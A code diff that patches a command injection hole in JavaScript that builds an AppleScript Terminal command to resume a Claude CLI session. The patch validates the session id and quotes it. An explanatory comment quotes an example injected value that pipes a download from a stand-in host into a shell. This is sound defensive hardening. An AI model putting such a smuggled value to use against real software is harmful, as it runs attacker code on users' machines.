@@ -77,7 +77,18 @@ export default {
       requiresRunMeta: 'sessionId',
       exec({ run, job, setting, execFileFn }) {
         const esc = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
-        const shellCmd = `cd ${JSON.stringify(job?.cwd || process.env.HOME)} && ${JSON.stringify(setting('claudePath', 'claude'))} --resume ${run.meta.sessionId}`;
+        // `Terminal.do script` IS arbitrary shell, so every interpolated value has
+        // to be quoted. sessionId was the one that was not: a value like
+        // `x; curl http://h/p|sh #` became a second command in the user's Terminal.
+        // Not reachable today (sessionId comes only from the CLI's own stream-json
+        // and no route writes runs.meta) — but "a client can only pick from a
+        // declared set" is a claim about the action *id*, not about what the action
+        // then builds, so this must not rely on that.
+        const sessionId = String(run?.meta?.sessionId ?? '');
+        if (!/^[A-Za-z0-9._-]{1,200}$/.test(sessionId)) {
+          return Promise.reject(new Error('this run has no usable session id to resume'));
+        }
+        const shellCmd = `cd ${JSON.stringify(job?.cwd || process.env.HOME)} && ${JSON.stringify(setting('claudePath', 'claude'))} --resume ${JSON.stringify(sessionId)}`;
         const osa = `tell application "Terminal"
   activate
   do script "${esc(shellCmd)}"
